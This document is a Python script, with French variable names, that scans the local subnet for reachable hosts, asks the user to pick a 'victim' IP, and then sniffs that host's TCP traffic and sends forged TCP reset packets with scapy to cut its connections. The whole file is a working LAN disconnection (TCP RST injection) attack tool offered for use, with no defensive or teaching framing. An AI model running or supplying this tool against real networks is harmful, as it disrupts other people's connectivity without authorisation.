import socket
import threading
import subprocess
from scapy.all import *

ipConnectees = {}

class NetScanThread(threading.Thread):

    def __init__(self, ip):
        self.ip = ip
        threading.Thread.__init__(self)

    def run(self):
        self.scanIp(self.ip)

    def scanIp(self, ip):
        try:
            hostname, alias, address = socket.gethostbyaddr(ip)
            global host
            ipConnectees[ip] = hostname
        except socket.herror:
            None

def rstConnexion(paquet, monIpLocal, ipVictime):
    ether = Ether(dst=paquet[Ether].src, src=paquet[Ether].dst)
    ip = IP(src=paquet[IP].dst, dst=paquet[IP].src, ihl=paquet[IP].ihl, flags=paquet[IP].flags, frag=paquet[IP].frag, ttl=paquet[IP].ttl, proto=paquet[IP].proto, id=paquet[IP].id)
    tcp = TCP(sport=paquet[TCP].dport, dport=paquet[TCP].sport, seq=paquet[TCP].ack, ack=paquet[TCP].seq, dataofs=paquet[TCP].dataofs, reserved=paquet[TCP].reserved, flags="R", window=paquet[TCP].window, options=paquet[TCP].options) 
    spoofPacket = ether/ip/tcp
    send(spoofPacket, verbose=0)



if __name__ == '__main__':

    listeIp = []

    monIpLocal = str(subprocess.check_output(['ipconfig']))

    # Refaire : regex
    monIpLocal = monIpLocal.split("Wi-Fi")[1]
    monIpLocal = monIpLocal.split("Adresse IPv4. . . . . . . . . . . . . .: ")[1]
    monIpLocal = monIpLocal.split("\\")[0]
    #

    print("Mon ip local : " + monIpLocal + "\n")

    ipAPing = monIpLocal.split(".")
    monIp = ipAPing.pop(-1)
    ipAPing = '.'.join(ipAPing) + "."

    for i in range(1, 255):
        listeIp.append(ipAPing + str(i))

    threads = []

    netScanThreads = [NetScanThread(ip) for ip in listeIp] 
    for thread in netScanThreads :
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("Liste Ip connectees :\n")
    for ip, hostname in ipConnectees.items():
        print(ip, ' ', hostname)

ipVictime = None
while(ipVictime not in ipConnectees):
    ipVictime = ipAPing
    ipVictime += input("\nSaisissez l'Ip a deconnecter : " + ipAPing)


paquet = sniff(count = 0, prn = lambda p: rstConnexion(p, monIpLocal, ipVictime), lfilter = lambda x: x.haslayer(IP) and x.haslayer(TCP) and x[IP].src == ipVictime)
